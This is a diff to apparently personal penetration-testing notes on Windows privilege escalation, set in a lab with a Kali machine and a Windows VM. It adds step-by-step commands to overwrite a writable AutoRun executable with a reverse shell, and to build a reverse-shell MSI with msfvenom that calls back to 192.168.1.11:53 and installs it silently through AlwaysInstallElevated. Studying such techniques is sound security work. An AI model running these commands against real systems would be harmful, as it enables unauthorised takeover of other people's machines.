@@ -547,8 +547,38 @@ If you are able to write to an AutoRun executable, and are able to restart the s
 > reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 and then use accesschk.exe to verify the permissions on each one:
 > .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
-
+3. The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:
+> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
+4. Copy our reverse shell executable to overwrite the AutoRun executable:
+> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
+5. Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the “user” account and log in as the “admin” account first.
 ```
+
+## AlwaysInstallElevated
+MSI files are package files used to install applications.These files run with the permissions of the user trying to install them.
+Windows allows for these installers to be run with elevated (i.e. admin) privileges.
+
+If this is the case, we can generate a malicious MSI file which contains a reverse shell.
+The catch is that two Registry settings must be enabled for this to work. The “AlwaysInstallElevated” value must be set to 1 for both the local machine:
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+and the current user:
+
+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+If either of these are missing or disabled, the exploit will not work.
+
+```bash
+1. Use winPEAS to see if both registry values are set:
+> .\winPEASany.exe quiet windowscreds
+2. Alternatively, verify the values manually:
+> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+3. Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
+4. Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:
+> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+```
+
 
 
 ### Iperius Backup 6.1.0 - Privilege Escalation
